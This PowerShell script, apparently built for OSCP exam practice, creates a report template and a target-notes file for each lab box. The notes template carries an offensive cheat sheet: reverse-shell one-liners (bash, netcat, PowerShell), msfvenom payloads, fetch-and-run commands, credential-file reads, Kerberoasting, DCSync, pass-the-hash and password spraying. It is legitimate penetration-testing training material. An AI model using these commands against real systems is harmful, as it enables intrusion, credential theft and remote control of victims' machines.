<#
.SYNOPSIS
    OSCP Box Setup Script (PowerShell Port)
.DESCRIPTION
    Creates a new target directory with all necessary scaffolding for OSCP boxes.
    Generates target.md (working notes) and report/ directory with report template.
.EXAMPLE
    .\start.ps1
#>

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$TargetsDir = Join-Path $ScriptDir 'TARGETS'
$ReportTemplateSrc = Join-Path $ScriptDir 'src' 'OSCP-exam-report-template_OS_v2.md'
$ConfigFile = Join-Path $ScriptDir '.oscp.conf'

# -------------------------------------------------------------------
# Load or create config (email + OSID)
# -------------------------------------------------------------------
$OscpEmail = ''
$OscpOsid = ''

if (Test-Path $ConfigFile) {
    Get-Content $ConfigFile | ForEach-Object {
        if ($_ -match '^OSCP_EMAIL="(.+)"') { $OscpEmail = $Matches[1] }
        if ($_ -match '^OSCP_OSID="(.+)"') { $OscpOsid = $Matches[1] }
    }
}

if (-not $OscpEmail -or -not $OscpOsid) {
    Write-Host '============================================'
    Write-Host '  First-time setup'
    Write-Host '============================================'
    Write-Host ''
    $OscpEmail = (Read-Host -Prompt 'Your email').Trim()
    $OscpOsid = (Read-Host -Prompt 'Your OSID (e.g. OS-12345)').Trim()
    @"
OSCP_EMAIL="$OscpEmail"
OSCP_OSID="$OscpOsid"
"@ | Set-Content -Path $ConfigFile
    Write-Host ''
    Write-Host "Saved to $ConfigFile"
    Write-Host ''
}

# -------------------------------------------------------------------
# Prompt for input
# -------------------------------------------------------------------
Write-Host '============================================'
Write-Host "  OSCP Box Setup  [$OscpOsid]"
Write-Host '============================================'
Write-Host ''

$BoxName = (Read-Host -Prompt 'Box name (e.g. Help)').Trim()
$BoxNumber = (Read-Host -Prompt 'Box number (e.g. 01)').Trim()

if (-not $BoxName -or -not $BoxNumber) {
    Write-Host 'Error: Box name and number are required.'
    exit 1
}

Write-Host ''
Write-Host 'Box type:'
Write-Host '  1) Linux'
Write-Host '  2) Windows'
Write-Host '  3) AD (Active Directory set)'
$BoxTypeNum = (Read-Host -Prompt 'Select [1/2/3]').Trim()

$BoxType = switch ($BoxTypeNum) {
    '1' { 'linux' }
    '2' { 'windows' }
    '3' { 'ad' }
    default { Write-Host 'Error: Invalid selection.'; exit 1 }
}

$BoxDir = Join-Path $TargetsDir "$BoxNumber-$BoxName"
$Today = Get-Date -Format 'yyyy-MM-dd'

# -------------------------------------------------------------------
# Check for existing directory
# -------------------------------------------------------------------
if (Test-Path $BoxDir) {
    Write-Host ''
    Write-Host "Warning: $BoxDir already exists."
    $Confirm = (Read-Host -Prompt 'Overwrite? (y/N)').Trim()
    if ($Confirm -ne 'y' -and $Confirm -ne 'Y') {
        Write-Host 'Aborted.'
        exit 0
    }
    Remove-Item -Recurse -Force $BoxDir
}

# -------------------------------------------------------------------
# Create directory structure
# -------------------------------------------------------------------
$ReportDir = Join-Path $BoxDir 'report'
New-Item -ItemType Directory -Path (Join-Path $ReportDir 'output') -Force | Out-Null

# -------------------------------------------------------------------
# Copy _config.yml
# -------------------------------------------------------------------
$ConfigYml = Join-Path $ScriptDir '_config.yml'
if (Test-Path $ConfigYml) {
    Copy-Item $ConfigYml (Join-Path $ReportDir '_config.yml')
}

# -------------------------------------------------------------------
# Create build.ps1 (compile report to PDF + 7z)
# -------------------------------------------------------------------
$buildContent = @"
# Build report: PDF + 7z
`$ScriptDir = Split-Path -Parent `$MyInvocation.MyCommand.Path
Set-Location `$ScriptDir
..\..\..\osert.ps1 generate -i report.md -o output -e OSCP -s $OscpOsid
"@
Set-Content -Path (Join-Path $ReportDir 'build.ps1') -Value $buildContent

# -------------------------------------------------------------------
# Create report.md
# -------------------------------------------------------------------
$reportContent = @"
---
title: "Offensive Security Certified Professional Exam Report"
author: ["$OscpEmail", "OSID: $OscpOsid"]
date: "$Today"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Offensive Security OSCP Exam Report

## Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course.
This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab and Exam network.
The student is tasked with following a methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.

## Requirements

The student will be required to fill out this penetration testing report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable
- Any additional items that were not included

# High-Level Summary

I was tasked with performing an internal penetration test towards Offensive Security Labs.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, I had administrative level access to multiple systems.

## Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure.
Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, I was tasked with exploiting the lab and exam network.

## Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.

# $BoxName - Target

## Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
IP_ADDRESS        | **TCP**: \
**UDP**:

**Nmap Scan Results:**

``````
(paste nmap output here)
``````

## Initial Access - XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** Critical

**Steps to reproduce the attack:**

**Proof of Concept Code:**

``````
(paste code here)
``````

**Proof Screenshot:**

<!-- paste screenshot here -->

**local.txt content:**

## Privilege Escalation - XXX

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** Critical

**Steps to reproduce the attack:**

**Proof of Concept Code:**

``````
(paste code here)
``````

## Post-Exploitation

**Proof Screenshot:**

<!-- paste screenshot here -->

**proof.txt content:**

# Additional Items Not Mentioned in the Report

This section is placed for any additional items that were not mentioned in the overall report.
"@
Set-Content -Path (Join-Path $ReportDir 'report.md') -Value $reportContent

# -------------------------------------------------------------------
# Create target.md - Common header (Phase 0, 1, 2)
# -------------------------------------------------------------------
$targetMd = @"
# $BoxName

## Box Info
- IP:
- OS: $BoxType
- Difficulty:
- Date Started: $Today

---

## Phase 0: Setup

``````bash
export IP=10.10.10.x
export LHOST=`$(ip addr show tun0 | grep 'inet ' | awk '{print `$2}' | cut -d/ -f1)
export LPORT=443
``````

``````bash
echo "`$IP <domain>" | sudo tee -a /etc/hosts
``````

``````bash
# Listeners
rlwrap nc -lvnp `$LPORT
python3 -m http.server 1337
impacket-smbserver smbfolder `$(pwd) -smb2support -user kali -password kali
``````

---

## Phase 1: Reconnaissance

### Automated Recon (Recon System)

``````bash
python3 recon_system.py -t `$IP --batch
python3 recon_system.py -t `$IP --full --batch
python3 recon_system.py -t `$IP -d <domain> --full --batch
``````

### Port Scan (TCP)

``````
nmap -p- -sC -sV --min-rate=1000 -T4 `$IP
``````

``````
(paste results)
``````

### Port Scan (UDP)

``````
sudo nmap -sU --top-ports 100 --min-rate 5000 `$IP
``````

``````
(paste results)
``````

### Web Enumeration

#### Tech Stack and Hosts

- [ ] Tech stack identified (whatweb / Wappalyzer)

``````
whatweb http://`$IP
curl -s -I http://`$IP
``````

- [ ] Domain/Redirect gefunden? In /etc/hosts eintragen

``````
(paste results)
``````

#### Directory and VHost Fuzzing

- [ ] Directory fuzzing (feroxbuster / gobuster)

``````
feroxbuster -u http://`$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
``````
``````
gobuster dir -t 20 -u http://`$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
``````

PHP / Apache / Linux:
``````
feroxbuster -u http://`$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak
``````

ASP / IIS / Windows:
``````
feroxbuster -u http://`$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,aspx,html,txt
``````

``````
(paste results)
``````

- [ ] VHost fuzzing (ffuf)

``````
ffuf -u http://`$IP -H "Host: FUZZ.`$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fc 301,302 --fs <default_size>
``````

``````
(paste results)
``````

#### Content and Application

- [ ] Source code reviewed (comments, hidden fields, JS)
- [ ] Default creds tested
- [ ] CMS identified? (WordPress / Drupal / Joomla / custom)
- [ ] Parameter fuzzing
- [ ] API endpoints

``````
(paste results)
``````

### Other Services

- [ ] SMB

``````
smbmap -H `$IP
smbclient -N -L //`$IP
crackmapexec smb `$IP -u '' -p '' --shares
``````

- [ ] FTP

``````
ftp `$IP
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor `$IP
``````

- [ ] SNMP / DNS / SMTP / LDAP / RPC / NFS

``````
(paste findings)
``````

---

## Phase 2: Initial Access

### Vulnerability:
### Attack Vector:

### Steps:

``````
(commands used)
``````

### Proof (local.txt):

"@

# -------------------------------------------------------------------
# OS-specific sections
# -------------------------------------------------------------------
if ($BoxType -eq 'linux') {
    $targetMd += @'

```
cat local.txt && whoami && hostname && ip a
```

---

## Phase 3: Post-Exploitation

### Stabilize Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160
```

### Credential Hunting

```bash
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | head -30
cat /etc/shadow
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
cat /home/*/.bash_history
grep -ri "password" /var/www/ 2>/dev/null
```

### Internal Enumeration

```bash
ip a && ip route && arp -a && ss -tlnp
```

---

## Phase 4: Privilege Escalation

### Linux Enumeration Checklist

- [ ] LinPEAS / pspy

```
curl http://$LHOST:1337/linpeas.sh | bash | tee linpeas.txt
curl http://$LHOST:1337/pspy64 -o pspy64 && chmod +x pspy64 && ./pspy64
```

- [ ] sudo -l
- [ ] SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
- [ ] Capabilities: `getcap -r / 2>/dev/null`
- [ ] Cron jobs: `cat /etc/crontab && ls -la /etc/cron*`
- [ ] Writable files in PATH
- [ ] Wildcard injection
- [ ] Kernel version: `uname -a && cat /etc/os-release`
- [ ] NFS no_root_squash: `cat /etc/exports`
- [ ] Docker/LXD group: `id`
- [ ] Writable /etc/passwd or /etc/shadow
- [ ] Internal services (127.0.0.1 only): `ss -tlnp`
- [ ] SSH keys
- [ ] Config files with passwords
- [ ] History files

```
(paste linpeas/privesc highlights)
```

### Privesc Vector:
### Steps:

```
(commands used)
```

### Proof (proof.txt):

```
cat /root/proof.txt && whoami && hostname && ip a
```

'@
} elseif ($BoxType -eq 'windows') {
    $targetMd += @'

```
type local.txt & whoami & hostname & ipconfig
```

---

## Phase 3: Post-Exploitation

### Stabilize Shell

```powershell
powershell -ep bypass
```

### Credential Hunting

```powershell
cmdkey /list
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"
type C:\Windows\Panther\Unattend.xml
reg query HKLM /f password /t REG_SZ /s
```

### Internal Enumeration

```powershell
ipconfig /all && route print && arp -a && netstat -ano
```

---

## Phase 4: Privilege Escalation

### Windows Enumeration Checklist

- [ ] winPEAS / PrivescCheck

```powershell
iwr -uri http://$LHOST:1337/winpeas64.exe -Outfile winpeas64.exe
.\winpeas64.exe
```

- [ ] Basic info: `whoami /priv`, `whoami /groups`, `net user`, `systeminfo`
- [ ] SeImpersonatePrivilege (PrintSpoofer / GodPotato)
- [ ] Service misconfiguration (unquoted paths, writable binaries)
- [ ] Scheduled tasks
- [ ] AlwaysInstallElevated
- [ ] Mimikatz (requires admin)

```
(paste winpeas/privesc highlights)
```

### Privesc Vector:
### Steps:

```
(commands used)
```

### Proof (proof.txt):

```
type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig
```

'@
} elseif ($BoxType -eq 'ad') {
    $targetMd += @'

```
type local.txt & whoami & hostname & ipconfig
```

---

## Phase 3: Post-Exploitation

### Credential Hunting

```powershell
cmdkey /list
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"
```

---

## Phase 4: Active Directory

### Domain Info
- Domain:
- DC IP:
- Domain Users found:
- Domain Admins:

### AD Checklist

- [ ] BloodHound/SharpHound: `.\SharpHound.exe --CollectionMethods All`
- [ ] Kerberoasting: `impacket-GetUserSPNs -request -dc-ip $IP domain/user:password`
- [ ] AS-REP Roasting: `impacket-GetNPUsers -dc-ip $IP -usersfile users.txt -no-pass domain/`
- [ ] DCSync: `impacket-secretsdump domain/user:"password"@$IP`
- [ ] Password Spray: `crackmapexec smb $IP -u users.txt -p 'Password1' --continue-on-success`
- [ ] GPP passwords: `Groups.xml` in SYSVOL
- [ ] LAPS: `ms-Mcs-AdmPwd` readable?
- [ ] Responder / NTLM Relay

```
(paste BloodHound / enumeration findings)
```

---

## Machine 1: _______________

### IP:
### Role:
### Initial Access:
### local.txt:

### Privilege Escalation:
### proof.txt:

---

## Machine 2: _______________

### IP:
### Role:
### Lateral Movement Method:
### local.txt:

### Privilege Escalation:
### proof.txt:

---

## Machine 3 (DC): _______________

### IP:
### Role: Domain Controller
### Domain Escalation Method:
### proof.txt:

---

## Attack Path Summary

```
Machine 1 (foothold) --> Machine 2 (lateral) --> DC (domain admin)
```

'@
}

# --- Common footer (all types) ---
$targetMd += @'

---

## Phase 5: Lateral Movement

### Tunneling

```bash
# Chisel SOCKS Proxy
./chisel server -p 8000 --reverse                    # attacker
./chisel client $LHOST:8000 R:socks                  # target

# SSH Tunneling
ssh -N -L 0.0.0.0:LOCAL_PORT:TARGET_IP:TARGET_PORT user@ssh_server
ssh -N -D 0.0.0.0:9999 user@ssh_server

# Ligolo-ng
./proxy -selfcert -laddr 0.0.0.0:11601               # attacker
./agent -connect $LHOST:11601 -ignore-cert             # target
```

### Pass the Hash

```bash
impacket-psexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@$IP
evil-winrm -i $IP -u Administrator -H NTLM_HASH
crackmapexec smb $IP -u Administrator -H NTLM_HASH
```

### Remote Execution

```bash
evil-winrm -i $IP -u user -p password
impacket-psexec domain/user:password@$IP
xfreerdp /u:user /p:password /v:$IP /cert:ignore
```

---

## Phase 6: Loot & Proof

### Capture Flags

```bash
# Linux
cat /root/proof.txt && cat /home/*/local.txt && whoami && hostname && ip a
```

```powershell
# Windows
type C:\Users\Administrator\Desktop\proof.txt
whoami && hostname && ipconfig
```

---

## Credentials Found

| Username | Password/Hash | Service | Source |
|----------|--------------|---------|--------|
|          |              |         |        |

## Flags
- local.txt:
- proof.txt:

## Loot
<!-- hashes, keys, tokens, interesting files -->

## Notes
<!-- timeline, dead ends, things to remember -->

---

## Quick Reference

### Reverse Shells

```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
```

```powershell
powershell -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"
```

```bash
# msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
```

### File Transfer

```bash
python3 -m http.server 1337                          # attacker
wget http://$LHOST:1337/file                          # linux target
```

```powershell
iwr -uri http://$LHOST:1337/file.exe -Outfile file.exe   # windows target
certutil -urlcache -split -f "http://$LHOST:1337/file.exe" file.exe
```

### Hash Cracking

| Hash Type | Mode | Command |
|-----------|------|---------|
| NTLM | 1000 | `hashcat -m 1000 hash.txt rockyou.txt` |
| Net-NTLMv2 | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberoast | 13100 | `hashcat -m 13100 hash.txt rockyou.txt` |
| AS-REP | 18200 | `hashcat -m 18200 hash.txt rockyou.txt` |
| sha512crypt | 1800 | `hashcat -m 1800 hash.txt rockyou.txt` |
| bcrypt | 3200 | `hashcat -m 3200 hash.txt rockyou.txt` |

'@

# Write target.md
Set-Content -Path (Join-Path $BoxDir 'target.md') -Value $targetMd

# -------------------------------------------------------------------
# Print summary
# -------------------------------------------------------------------
Write-Host ''
Write-Host '============================================'
Write-Host '  Box directory created successfully!'
Write-Host '============================================'
Write-Host ''
Write-Host "  $BoxDir\"
Write-Host '  +-- target.md        (all-in-one working doc)'
Write-Host '  +-- report\'
Write-Host '      +-- report.md    (OSCP report template)'
Write-Host '      +-- build.ps1    (.\build.ps1 -> PDF + 7z)'
Write-Host '      +-- output\'
Write-Host '      +-- _config.yml'
Write-Host ''
Write-Host '  Usage:'
Write-Host "    # Work notes:  edit $BoxDir\target.md"
Write-Host "    # Report:      edit $BoxDir\report\report.md"
Write-Host "    # Generate PDF: $BoxDir\report\build.ps1"
Write-Host ''
